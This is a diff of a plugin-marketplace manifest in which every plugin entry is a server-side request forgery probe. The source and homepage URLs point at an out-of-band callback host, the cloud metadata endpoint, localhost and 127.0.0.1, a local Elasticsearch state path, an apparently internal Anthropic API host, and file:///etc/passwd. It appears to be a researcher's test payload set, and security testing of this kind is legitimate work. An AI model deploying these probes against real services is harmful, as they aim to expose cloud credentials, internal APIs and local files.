@@ -4,67 +4,69 @@
   "owner": {"name": "research", "email": "liamconner10@gmail.com"},
   "plugins": [
     {
-      "name": "ssrf-probe-1",
-      "description": "url type",
+      "name": "ssrf-probe-https-oast",
+      "description": "https oast",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-source-url-058"
+        "url": "https://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-https-oast-058"
       }
     },
     {
-      "name": "ssrf-probe-2",
-      "description": "git-subdir type",
-      "category": "research",
-      "source": {
-        "source": "git-subdir",
-        "url": "http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-source-gitsubdir-058",
-        "path": "plugins/x",
-        "ref": "main"
-      }
-    },
-    {
-      "name": "ssrf-probe-3-imds",
-      "description": "imds probe",
+      "name": "ssrf-probe-https-attacker",
+      "description": "arbitrary https hostname",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "http://169.254.169.254/latest/meta-data/"
+        "url": "https://example.com/anything-058"
       }
     },
     {
-      "name": "ssrf-probe-4-file",
-      "description": "file probe",
+      "name": "ssrf-probe-https-imds",
+      "description": "imds https",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "file:///etc/passwd"
+        "url": "https://169.254.169.254/latest/meta-data/"
       }
     },
     {
-      "name": "ssrf-probe-5-localhost",
-      "description": "localhost probe",
-      "category": "research",
-      "source": {
-        "source": "url",
-        "url": "http://localhost:9200/_cluster/state"
-      }
-    },
-    {
-      "name": "ssrf-probe-6-internal",
+      "name": "ssrf-probe-https-internal-anth",
       "description": "internal anthropic",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "http://internal.api.anthropic.com/whoami"
+        "url": "https://internal.api.anthropic.com/whoami"
       }
     },
     {
-      "name": "ssrf-probe-7-homepage",
-      "description": "homepage field probe",
+      "name": "ssrf-probe-https-localhost",
+      "description": "localhost",
       "category": "research",
-      "homepage": "http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-plugin-homepage-058",
-      "source": "./plugin-7"
+      "source": {
+        "source": "url",
+        "url": "https://localhost/"
+      }
+    },
+    {
+      "name": "ssrf-probe-https-127",
+      "description": "127.0.0.1",
+      "category": "research",
+      "source": {
+        "source": "url",
+        "url": "https://127.0.0.1/"
+      }
+    },
+    {
+      "name": "ssrf-probe-git-https-oast",
+      "description": "git-subdir https oast",
+      "category": "research",
+      "source": {
+        "source": "git-subdir",
+        "url": "https://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/git-oast-058.git",
+        "path": "plugins/x",
+        "ref": "main"
+      }
     }
   ]
 }
